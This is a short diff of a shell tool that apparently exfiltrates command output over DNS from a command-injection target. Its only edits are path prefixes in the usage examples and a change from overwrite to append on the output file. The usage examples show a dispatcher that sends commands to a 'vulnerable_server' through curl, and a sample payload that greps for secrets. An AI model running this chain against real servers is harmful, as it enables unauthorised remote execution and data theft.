@@ -28,11 +28,11 @@ Usage:
     -v                  Verbose mode
     
     Examples:
-    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher.sh -- 'ls -lha|grep secret'
+    stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x ./dispatcher.sh -- 'ls -lha|grep secret'
     cat dispatcher.sh: 
         \$@
     
-    $0 -h youdns.ns -w -d "Resolve-DnsName" -x dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+    $0 -h youdns.ns -w -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {\$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
     cat dispatcher.sh
         curl https://vulnerable_server --data-urlencode "cmd=\${1}"
 !
@@ -288,6 +288,6 @@ done && echo
 
 cmd_out=$(echo $cmd_out | tr -d .)
 
-echo "$cmd_out" | strict_translator -d | b64 -d > "$outfile"
+echo "$cmd_out" | strict_translator -d | b64 -d >> "$outfile"
 
 setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)
